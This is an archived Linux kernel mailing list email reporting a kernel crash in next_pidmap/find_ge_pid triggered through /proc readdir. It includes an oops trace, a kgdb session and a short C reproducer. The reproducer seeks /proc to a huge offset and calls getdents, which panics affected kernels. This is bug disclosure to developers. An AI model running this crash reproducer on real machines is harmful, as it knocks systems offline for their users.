Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1753318Ab1DRM6C (ORCPT <rfc822;w@1wt.eu>);
	Mon, 18 Apr 2011 08:58:02 -0400
Received: from mail-pw0-f46.google.com ([209.85.160.46]:37033 "EHLO
	mail-pw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1752292Ab1DRM54 convert rfc822-to-8bit (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Mon, 18 Apr 2011 08:57:56 -0400
MIME-Version: 1.0
In-Reply-To: <BANLkTim8=Tf62gfTePczL11K_tYm71NXwg@mail.gmail.com>
References: <BANLkTik8nOXJb3J9=m4-2Ugw4P7AFzCQoA@mail.gmail.com>
	<BANLkTim8=Tf62gfTePczL11K_tYm71NXwg@mail.gmail.com>
Date: Mon, 18 Apr 2011 14:57:55 +0200
Message-ID: <BANLkTi=5k1r-hxNerVKAsXeKksvLSaSU8A@mail.gmail.com>
Subject: Re: Kernel panic (NULL ptr deref?) in find_ge_pid()/next_pidmap()
 (via sys_getdents or sys_readdir)
From: =?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?= <robert@swiecki.net>
To: linux-kernel@vger.kernel.org
Cc: taviso@cmpxchg8b.com, security@kernel.org
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8BIT
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On Mon, Apr 18, 2011 at 8:53 AM, Robert Święcki <robert@swiecki.net> wrote:
> On Wed, Apr 13, 2011 at 11:12 PM, Robert Święcki <robert@swiecki.net> wrote:
>> Oops: (kdb's dumpall attached)
>>
>> [18608.476700] general protection fault: 0000 [#1] PREEMPT SMP
>> [18608.476704] last sysfs file:
>> /sys/devices/platform/microcode/power/runtime_status
>> [18608.477002] CPU 0
>> [18608.477002] Pid: 31157, comm: iknowthis Not tainted 2.6.39-rc3 #4
>> Dell Inc.                 Precision WorkStation 390    /0GH911
>> [18608.477002] RIP: 0010:[<ffffffff810ac3cc>]  [<ffffffff810ac3cc>]
>> next_pidmap+0x38/0x7f
>> [18608.477002] RSP: 0000:ffff88007b40fd48  EFLAGS: 00010203
>> [18608.477002] RAX: 0000000000000000 RBX: 001fffff82753988 RCX: 0000000000000034
>> [18608.477002] RDX: 0000000000003b6e RSI: 001ffffffff2c980 RDI: ffffffff82827000
>> [18608.477002] RBP: ffff88007b40fd68 R08: a000000000000000 R09: 5b68000000000000
>> [18608.477002] R10: ffff88007b40e000 R11: ffff88007b40fdb8 R12: ffffffff82827000
>> [18608.477002] R13: ffffffff82827808 R14: ffffffff81199146 R15: ffffffff81199146
>> [18608.477002] FS:  0000000000000000(0000) GS:ffff88012bc00000(0063)
>> knlGS:00000000f75406c0
>> [18608.477002] CS:  0010 DS: 002b ES: 002b CR0: 000000008005003b
>> [18608.477002] CR2: 000000000809601c CR3: 0000000118457000 CR4: 00000000000006f0
>> [18608.477002] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
>> [18608.477002] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
>> [18608.477002] Process iknowthis (pid: 31157, threadinfo
>> ffff88007b40e000, task ffff880124f6c560)
>> [18608.477002] Stack:
>> [18608.477002]  ffff88011e2e5c80 00000000964c3b6d 0000000000000000
>> ffffffff82827000
>> [18608.477002]  ffff88007b40fd98 ffffffff810ac446 ffff88011e2e5c80
>> ffffffff82827000
>> [18608.477002]  00000000964c3b6d ffff880124f68000 ffff88007b40fdf8
>> ffffffff811aedbb
>> [18608.477002] Call Trace:
>> [18608.477002]  [<ffffffff810ac446>] find_ge_pid+0x33/0x45
>> [18608.477002]  [<ffffffff811aedbb>] next_tgid+0x3c/0x93
>> [18608.477002]  [<ffffffff81199146>] ? compat_sys_io_getevents+0xae/0xae
>> [18608.477002]  [<ffffffff810abf69>] ? get_pid_task+0x49/0x51
>> [18608.477002]  [<ffffffff811aef6f>] proc_pid_readdir+0x15d/0x1b0
>> [18608.477002]  [<ffffffff81199146>] ? compat_sys_io_getevents+0xae/0xae
>> [18608.477002]  [<ffffffff81199146>] ? compat_sys_io_getevents+0xae/0xae
>> [18608.477002]  [<ffffffff81199146>] ? compat_sys_io_getevents+0xae/0xae
>> [18608.477002]  [<ffffffff811ab262>] proc_root_readdir+0x43/0x4b
>> [18608.477002]  [<ffffffff8116bd57>] vfs_readdir+0x71/0xae
>> [18608.477002]  [<ffffffff81197d18>] compat_sys_getdents+0x81/0xcc
>> [18608.477002]  [<ffffffff81f26703>] ia32_do_call+0x13/0x13
>> [18608.477002] Code: 0f 1f 44 00 00 ff c6 49 89 fc 89 f2 4c 8d af 08
>> 08 00 00 48 63 f6 81 e2 ff 7f 00 00 48 c1 ee 0f 48 c1 e6 04 48 8d 5c
>> 37 08 eb 36
>> [18608.477002]  8b 7b 08 48 85 ff 74 27 48 63 d2 be 00 80 00 00 e8 66 ab 3e
>> [18608.477002] RIP  [<ffffffff810ac3cc>] next_pidmap+0x38/0x7f
>> [18608.477002]  RSP <ffff88007b40fd48>
>> [18626.313012] ---[ end trace 947a53151707da51 ]---
>
> And a quick kgdb session:
>
> (gdb) target remote /dev/ttyS0
> Remote debugging using /dev/ttyS0
> next_pidmap (pid_ns=0xffffffff82827000, last=<value optimized out>) at
> kernel/pid.c:229
> 229                     if (unlikely(!map->page))
>
> (gdb) p map
> $1 = (struct pidmap *) 0x1fffff82745c68
> (gdb) p map->page
> Cannot access memory at address 0x1fffff82745c70
>
> (gdb) bt
> #0  next_pidmap (pid_ns=0xffffffff82827000, last=<value optimized
> out>) at kernel/pid.c:229
> #1  0xffffffff810ac446 in find_ge_pid (nr=-1889315394,
> ns=0xffffffff82827000) at kernel/pid.c:527
> #2  0xffffffff811aedbb in next_tgid (ns=0xffffffff82827000, iter=...)
> at fs/proc/base.c:3087
> #3  0xffffffff811aef6f in proc_pid_readdir (filp=0xffff880020155840,
> dirent=<value optimized out>, filldir=0xffffffff811992c0
> <compat_fillonedir>) at fs/proc/base.c:3146
> #4  0xffffffff811ab262 in proc_root_readdir (filp=0xffff880020155840,
> dirent=0xffff8800c82d1f48, filldir=0xffffffff811992c0
> <compat_fillonedir>) at fs/proc/root.c:159
> #5  0xffffffff8116bd57 in vfs_readdir (file=0xffff880020155840,
> filler=0xffffffff811992c0 <compat_fillonedir>, buf=0xffff8800c82d1f48)
> at fs/readdir.c:40
> #6  0xffffffff81197da9 in compat_sys_old_readdir (fd=<value optimized
> out>, dirent=0xf777a000, count=<value optimized out>) at
> fs/compat.c:901
> #7  <signal handler called>
> #8  0x00000000080658d2 in ?? ()
> Cannot access memory at address 0x29d58137
>
> (gdb) up
> #1  0xffffffff810ac446 in find_ge_pid (nr=-1889315394,
> ns=0xffffffff82827000) at kernel/pid.c:527
> 527                     nr = next_pidmap(ns, nr);
>
> (gdb) p nr
> $5 = -1889315394
>
> (gdb) up
> #2  0xffffffff811aedbb in next_tgid (ns=0xffffffff82827000, iter=...)
> at fs/proc/base.c:3087
> 3087            pid = find_ge_pid(iter.tgid, ns);
>
> (gdb) p iter
> $8 = {tgid = 2405651902, task = 0x0}
>
> Might it be unsigned (2405651902) vs signed (-1889315394) problem? The
> map is counted as
>
> map = &pid_ns->pidmap[(last + 1)/BITS_PER_PAGE];
>
> so

and a repro - should be quite obvious for FS folks, I guess
filp->f_pos needs better checking in proc's readdir (or in llseek).
Works with at least 2.6.32 - 2.6.39-rc3

=====================================================
// Found by Tavis Ormandy's (taviso@cmpxchg8b.com):
// http://code.google.com/p/iknowthis/
// Analyzed by Robert Swiecki <robert@swiecki.net>
#define _GNU_SOURCE 1
#define _LARGEFILE64_SOURCE
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>

int main(void)
{
  int fd = open("/proc", O_DIRECTORY | O_RDONLY);
  if (fd == -1) {
    perror("open");
    return -1;
  }
  struct linux_dirent {
    long           d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
  };
  lseek64(fd, 4000000000ULL, SEEK_SET);
  struct linux_dirent b[100];
  syscall(__NR_getdents, fd, b, sizeof(b));
}
=====================================================

-- 
Robert Święcki
